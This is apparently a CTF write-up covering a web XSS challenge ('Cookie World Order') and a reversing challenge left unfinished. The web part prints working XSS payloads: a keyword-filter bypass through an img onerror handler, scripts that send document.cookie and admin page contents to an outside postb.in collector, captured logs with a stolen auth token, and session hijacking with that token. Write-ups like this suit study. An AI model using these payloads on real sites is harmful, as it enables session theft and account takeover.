Cookie World Order (**web**)

    Good job! You found a further credential that looks like a VPN 
    referred to as the cWo. The organization appears very clandestine 
    and mysterious and reminds you of the secret ruling class of hard 
    shelled turtle-like creatures of Xenon. Funny they trust their 
    security to a contractor outside their systems, especially one with 
    such bad habits. Upon further snooping you find a video feed of 
    those "Cauliflowers" which look to be the dominant lifeforms and 
    members of the cWo. Go forth and attain greater access to reach 
    this creature!

Similarly with day 3 web problem case, we have a URL: https://cwo-xss.web.ctfcompetition.com/

Opening it and observing very similar page with Admin and field for 
input some text message.

Trying to copy-paste previous solution:

    <script>
    var img=new Image();
    img.src="https://postb.in/1561479835927-8693528019357?cookie="+document.cookie;
    </script>

leads to reply "HACKER ALERT!".
After typing different string it comes out that input must not contain 
`script` or `alert` as a substring. Well, modern WEB is full of tricks 
and wistles. If you (like me) have no expirience with web programming, 
Googling can conpensate it. Just request something like "bypassing XSS 
filter".

Our first:

    <scrip&#0000116>
    aler&#0000116('XSS');
    </scrip&#0000116>

Unfortunately, server removed `<script>` tag. Hm, maybe there are tags 
that are "allowed", do check:
    
    <b> bold </b> 
    <a href="google.com"> google </a> 
    <img src="https://cwo-xss.web.ctfcompetition.com/static/img/profile.png">

Yes, links and images work well! But links mostly requires user's 
actions, and we can be sure, that Admin bot will not click on any.
Now, back to the googling. And quickly find out that it is quite easy 
to call javascript from some event handlers, and if we can fire these 
events, then we can execute script. Common place is `onerror` event of 
`img` node, and it is very easy to fire error, just by giving it 
inproper source URL. Let's use our PostBin and try:

    <img src=x onerror="javascrip&#0000116:
    var img=new Image();
    img.src='https://postb.in/1561495195584-1681611498352?cookie='+document.cookie;">

... and back to PostBin:

    GET /1561495195584-1681611498352 2019-06-25T20:40:15.156Z
    Headers

        x-real-ip: 104.155.55.51
        host: postb.in
        connection: close
        pragma: no-cache
        cache-control: no-cache
        sec-fetch-mode: no-cors
        user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/77.0.3827.0 Safari/537.36
        accept: image/webp,image/apng,image/*,*/*;q=0.8
        sec-fetch-site: cross-site
        referer: https://cwo-xss.web.ctfcompetition.com/exploit?reflect=%3Cimg%20src=x%20onerror=%22javascrip&
        accept-encoding: gzip, deflate, br

    Query

        cookie: flag=CTF{3mbr4c3_the_c00k1e_w0r1d_ord3r}; auth=TUtb9PPA9cYkfcVQWYzxy4XbtyL3VNKz

    Body

But what could we see in Admin panel with his auth token? Open 
WenConsole, do

    document.cookie="auth=TUtb9PPA9cYkfcVQWYzxy4XbtyL3VNKz"

and click on "Admin" link. What we have here... Users and Livestreams 
seems are not working. Camera Controls say requests are allowed only 
from 127.0.0.1 (localhost). Maybe those HeadlessChrome-bot is on the 
same host with server? Let's try to see how bot renders this page:

    <img src=x onerror="javascrip&#0000116:
    fetch('/admin/controls', {method: 'get'}).then((res) => { return res.text(); }).then((data) => {
          var img=new Image();img.src='https://postb.in/1561495316858-4828648881521?'+data;
    });">

Bad luck, he see the same message:

    GET /1561495316858-4828648881521 2019-06-25T21:03:13.407Z
    Headers

        x-real-ip: 104.155.55.51
        host: postb.in
        connection: close
        pragma: no-cache
        cache-control: no-cache
        sec-fetch-mode: no-cors
        user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/77.0.3827.0 Safari/537.36
        accept: image/webp,image/apng,image/*,*/*;q=0.8
        sec-fetch-site: cross-site
        referer: https://cwo-xss.web.ctfcompetition.com/exploit?reflect=%3Cimg%20src=x%20onerror=%22javascrip&
        accept-encoding: gzip, deflate, br

    Query

        Requests only accepted from 127.0.0.1: 

Ok, the flag is

**CTF{3mbr4c3_the_c00k1e_w0r1d_ord3r}**


FriendSpaceBookPlusAllAccessRedPremium (**reversing**)


    Having snooped around like the expert spy you were never trained to 
    be, you found something that takes your interest: 
    "Cookie/www.FriendSpaceBookPlusAllAccessRedPremium.com"  But 
    unbeknownst to you, it was only the  700nm Wavelength herring 
    rather than a delicious cookie that you could have found.   It 
    looks exactly like a credential for another system.  You find 
    yourself in search of a friendly book to read.

    Having already spent some time trying to find a way to gain more 
    intelligence... and learn about those fluffy creatures, you 
    (several)-momentarily divert your attention here.  It's a place of 
    all the individuals in the world sharing large amounts of data with 
    one another. Strangely enough, all of the inhabitants seem to speak 
    using this weird pictorial language. And there is hot disagreement 
    over what the meaning of an eggplant is.

    But not much Cauliflower here.  They must be very private 
    creatures.  SarahH has left open some proprietary tools, surely 
    running this will take you to them.  Decipher this language and 
    move forth!


(TO BE DONE)

flag is
**CTF{Peace_from_Cauli!}**
